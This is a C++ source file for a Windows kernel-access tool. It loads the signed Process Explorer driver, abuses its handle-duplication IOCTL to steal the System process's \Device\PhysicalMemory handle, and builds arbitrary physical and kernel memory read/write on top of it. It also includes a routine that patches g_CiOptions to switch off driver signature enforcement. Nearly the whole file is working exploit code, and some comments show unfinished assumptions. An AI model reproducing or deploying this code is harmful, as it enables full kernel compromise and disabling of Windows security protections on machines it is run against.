#include "ProcessExplorerProvider.h"
#include "../Resources/DriverDataManager.h"
#include "../Utils.h"
#include "../ProviderSystem.h"
#include <iostream>
#include <vector>
#include <memory>
#include <filesystem>
#include <winternl.h>

typedef enum _SECTION_INHERIT_COMPAT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#pragma comment(lib, "ntdll.lib")

// NT API definitions needed for handle enumeration
extern "C" {
    NTSTATUS NTAPI NtQuerySystemInformation(
        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID SystemInformation,
        IN ULONG SystemInformationLength,
        OUT PULONG ReturnLength OPTIONAL
    );

    NTSTATUS NTAPI NtMapViewOfSection(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        SECTION_INHERIT InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );

    NTSTATUS NTAPI NtUnmapViewOfSection(
        HANDLE ProcessHandle,
        PVOID BaseAddress
    );
    
    // Minimal definition for Object Attributes if not available
    /*typedef struct _OBJECT_ATTRIBUTES {
        ULONG Length;
        HANDLE RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } OBJECT_ATTRIBUTES;*/
    
    // Wait, winternl.h might not have everything. Let's rely on what's there or linked.
}

namespace KernelMode {
    namespace Providers {

        ProviderLoadData ProcessExplorerProvider::loadData = {
            true,   // PhysMemoryBruteForce
            false,  // PML4FromLowStub
            true,   // PreferPhysical (It IS physical memory access)
            false,  // RequiresDSE (It's a signed Microsoft driver)
            (ULONG)(PROVIDER_CAP_PHYSICAL_MEMORY | PROVIDER_CAP_PREFER_PHYSICAL),
            L"Process Explorer (Sysinternals) - Physical Handle Stealing"
        };

        ProcessExplorerProvider::ProcessExplorerProvider()
            : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr), physicalMemorySection(NULL) {
        }

        ProcessExplorerProvider::~ProcessExplorerProvider() {
            Deinitialize();
        }

        bool ProcessExplorerProvider::Initialize(ULONG driverId, bool bypassDSE) {
            std::wcout << L"[+] Initializing ProcessExplorerProvider..." << std::endl;

            // Use DRIVER_ID_PROCEXP if default
            if (driverId == 0) {
                driverId = Resources::DRIVER_ID_PROCEXP; 
            }

            auto& driverManager = Resources::DriverDataManager::GetInstance();
            // DriverDataManager likely needs update to support PROCEXP ID if not present,
            // but for now we assume the ID is handled or we use a manual file.
            
            std::wstring tempPath = L"C:\\Windows\\Temp\\procexp.sys";
            // NOTE: You must ensure procexp.sys is in the driver list or drv folder!
            // Main.cpp usually handles extraction via DriverDataManager.
            
            // Try to extract/find it
            // If ID 30 (PROCEXP) isn't fully implemented in DriverDataManager, this might fail unless we patch it.
            // For this implementation, we will assume the file exists relative to us if extraction fails.
            
            if (!driverManager.ExtractDriver(driverId, tempPath)) {
                 // Fallback: look in ./drv/procexp.sys
                 std::wstring localPath = L"drv\\procexp.sys";
                 if (std::filesystem::exists(localPath)) {
                     // manually copy to temp
                     std::filesystem::copy_file(localPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                 }
            }
            this->dirDriverPath = tempPath;

            if (!InstallDriverService()) {
                std::wcerr << L"[-] Failed to install Process Explorer service (might already be running)." << std::endl;
            }

            if (!OpenDeviceHandle()) {
                std::wcerr << L"[-] Failed to open Process Explorer device handle." << std::endl;
                return false;
            }

            // The core magic: Steal the PhysicalMemory handle
            if (!AcquirePhysicalMemoryHandle()) {
                 std::wcerr << L"[-] Failed to acquire \\Device\\PhysicalMemory handle via Process Explorer." << std::endl;
                 return false;
            }

            std::wcout << L"[+] ProcessExplorerProvider initialized successfully." << std::endl;
            return true;
        }

        void ProcessExplorerProvider::Deinitialize() {
            if (physicalMemorySection) {
                CloseHandle(physicalMemorySection);
                physicalMemorySection = NULL;
            }
            if (deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(deviceHandle);
                deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (serviceHandle) {
                Utils::RemoveDriverService(serviceHandle);
                serviceHandle = nullptr;
            }
            if (!dirDriverPath.empty()) {
                DeleteFileW(dirDriverPath.c_str());
            }
        }

        std::wstring ProcessExplorerProvider::GetProviderName() const {
            return L"ProcessExplorer";
        }
        
        ULONG ProcessExplorerProvider::GetCapabilities() const {
            return loadData.Capabilities;
        }
        
        const ProviderLoadData* ProcessExplorerProvider::GetLoadData() const {
            return &loadData;
        }

        bool ProcessExplorerProvider::InstallDriverService() {
            // Service Name "PROCEXP152" is standard
            return (this->serviceHandle = Utils::CreateDriverService(L"PROCEXP152", this->dirDriverPath)) != nullptr;
        }
        
        bool ProcessExplorerProvider::OpenDeviceHandle() {
            // Device Name usually matches service/driver version
            // KDU uses PROCEXP152 for older signed versions that are exploitable
            deviceHandle = CreateFileW(
                L"\\\\.\\PROCEXP152",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            return deviceHandle != INVALID_HANDLE_VALUE;
        }

        // --- Driver Specific Primitives ---
        
        bool ProcessExplorerProvider::DriverOpenProcess(HANDLE processId, ACCESS_MASK desiredAccess, PHANDLE processHandle) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;
            
            // Input is just the PID (HANDLE size)
            // Output is the Handle (HANDLE size)
            HANDLE outputHandle = NULL;
            DWORD bytesReturned = 0;
            
            BOOL result = DeviceIoControl(
                deviceHandle,
                IOCTL_PROCEXP_OPEN_PROCESS,
                &processId,
                sizeof(processId),
                &outputHandle,
                sizeof(outputHandle),
                &bytesReturned,
                NULL
            );
            
            if (result && outputHandle) {
                *processHandle = outputHandle;
                return true;
            }
            return false;
        }

        bool ProcessExplorerProvider::DriverDuplicateHandle(HANDLE sourceProcessId, HANDLE sourceHandle, PHANDLE targetHandle) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;
            
            PEXP_DUPLICATE_HANDLE_REQUEST request;
            RtlZeroMemory(&request, sizeof(request));
            request.UniqueProcessId = sourceProcessId; // PID of source process
            request.SourceHandle = sourceHandle;
            
            HANDLE outputHandle = NULL;
            DWORD bytesReturned = 0;
            
            BOOL result = DeviceIoControl(
                deviceHandle,
                IOCTL_PROCEXP_DUPLICATE_HANDLE,
                &request,
                sizeof(request),
                &outputHandle,
                sizeof(outputHandle), // Process Explorer returns handle in output buffer
                &bytesReturned,
                NULL
            );
            
            if (result) {
                *targetHandle = outputHandle;
                return true;
            }
            return false;
        }

        // --- Handle Stealing Logic ---

        bool ProcessExplorerProvider::AcquirePhysicalMemoryHandle() {
            // Algorithm:
            // 1. Enumerate all system handles.
            // 2. Identify handles belonging to System (PID 4) that refer to sections.
            // 3. Duplicate them using DriverDuplicateHandle.
            // 4. Query object name. If "\Device\PhysicalMemory", we win.

            ULONG bufferSize = 1024 * 1024;
            std::unique_ptr<BYTE[]> buffer;
            NTSTATUS status;

            // Get Handle Information
            do {
                buffer = std::make_unique<BYTE[]>(bufferSize);
                status = NtQuerySystemInformation(SystemExtendedHandleInformation, buffer.get(), bufferSize, &bufferSize);
                if (status == ((NTSTATUS)0xC0000004L)) { // STATUS_INFO_LENGTH_MISMATCH
                    bufferSize *= 2;
                    continue;
                }
            } while (status == ((NTSTATUS)0xC0000004L));

            if (!NT_SUCCESS(status)) return false;

            PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)buffer.get();
            ULONG_PTR systemPid = 4;

            // Open System Process via Driver (it bypasses ACLs)
            // Note: KDU uses pid 4 for enumeration filtering but duplicate request takes PID.
            // We don't actually need an open handle to System process for the Dup IOCTL in procexp, 
            // the IOCTL takes the PID.

            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
                auto& entry = handleInfo->Handles[i];

                if (entry.UniqueProcessId == systemPid) {
                    // Filter for what looks like a section (Access mask usually 0xF001F for PhysMem)
                    // Or just try all handles that look relevant.
                    
                    // Optimisation: PhysMem handle usually has SECTION_ALL_ACCESS (0xF001F) or similar
                    if (entry.GrantedAccess == 0x000F001F || entry.GrantedAccess == 0xF001F) {
                        
                        HANDLE stolenHandle = NULL;
                        if (DriverDuplicateHandle((HANDLE)systemPid, (HANDLE)entry.HandleValue, &stolenHandle)) {
                            
                            // Check object name
                            // We need to use NtQueryObject/NtMapViewOfSection to verify.
                            // Simply trying to map it might be safer than querying name which can hang.
                            
                            // Let's try to map a small piece
                            PVOID baseAddress = NULL;
                            SIZE_T viewSize = 0x1000;
                            LARGE_INTEGER offset = { 0 };
                            
                            status = NtMapViewOfSection(
                                stolenHandle,
                                GetCurrentProcess(),
                                &baseAddress,
                                0,
                                0,
                                &offset,
                                &viewSize,
                                ViewUnmap,
                                0,
                                PAGE_READONLY
                            );
                            
                            if (NT_SUCCESS(status)) {
                                // It mapped! Now is it physical memory?
                                // Hard to verify without correct name, but 0xF001F on System is usually it.
                                NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
                                
                                // We found it (high probability)
                                // Keep this handle
                                this->physicalMemorySection = stolenHandle;
                                return true;
                            }
                            
                            CloseHandle(stolenHandle);
                        }
                    }
                }
            }
            return false;
        }
        
        // --- Memory Operations ---

        bool ProcessExplorerProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (!physicalMemorySection) return false;
            
            // Map the specific physical range
            PVOID mappedBase = NULL;
            LARGE_INTEGER sectionOffset;
            sectionOffset.QuadPart = physicalAddress;
            SIZE_T viewSize = size;
            
            NTSTATUS status = NtMapViewOfSection(
                physicalMemorySection,
                GetCurrentProcess(),
                &mappedBase,
                0,
                0,
                &sectionOffset,
                &viewSize,
                ViewUnmap,
                0, // MEM_TOP_DOWN not needed
                PAGE_READONLY
            );
            
            if (NT_SUCCESS(status)) {
                memcpy(buffer, mappedBase, size);
                NtUnmapViewOfSection(GetCurrentProcess(), mappedBase);
                return true;
            }
            return false;
        }

        bool ProcessExplorerProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (!physicalMemorySection) return false;
            
            // Map the specific physical range
            PVOID mappedBase = NULL;
            LARGE_INTEGER sectionOffset;
            sectionOffset.QuadPart = physicalAddress;
            SIZE_T viewSize = size;
            
            NTSTATUS status = NtMapViewOfSection(
                physicalMemorySection,
                GetCurrentProcess(),
                &mappedBase,
                0,
                0,
                &sectionOffset,
                &viewSize,
                ViewUnmap,
                0, 
                PAGE_READWRITE
            );
            
            if (NT_SUCCESS(status)) {
                memcpy(mappedBase, buffer, size);
                NtUnmapViewOfSection(GetCurrentProcess(), mappedBase);
                return true;
            }
            return false;
        }

        bool ProcessExplorerProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            // Requires translation
            uintptr_t phys = VirtualToPhysical(address);
            if (phys) return ReadPhysicalMemory(phys, buffer, size);
            return false;
        }

        bool ProcessExplorerProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
             uintptr_t phys = VirtualToPhysical(address);
             if (phys) return WritePhysicalMemory(phys, buffer, size);
             return false;
        }

        uintptr_t ProcessExplorerProvider::VirtualToPhysical(uintptr_t virtualAddress) {
             // We need a helper for V2P because we have PhysRW.
             // We can manually walk page tables.
             // Refer to Utils::VirtualToPhysical or similar if implemented, 
             // otherwise we need to implement page table walk using ReadPhysicalMemory.
             
             // Simplest is to delegate to a utility that uses *this* provider to read phys mem.
             // But for now, returning 0 might break usage if DSE/etc rely on Virtual Addressing.
             
             return Utils::VirtualToPhysical(this, virtualAddress);
        }

        bool ProcessExplorerProvider::BypassDSE() {
             // Standard CI!g_CiOptions patch
             return Utils::PatchCiOptions(this);
        }

    }
}
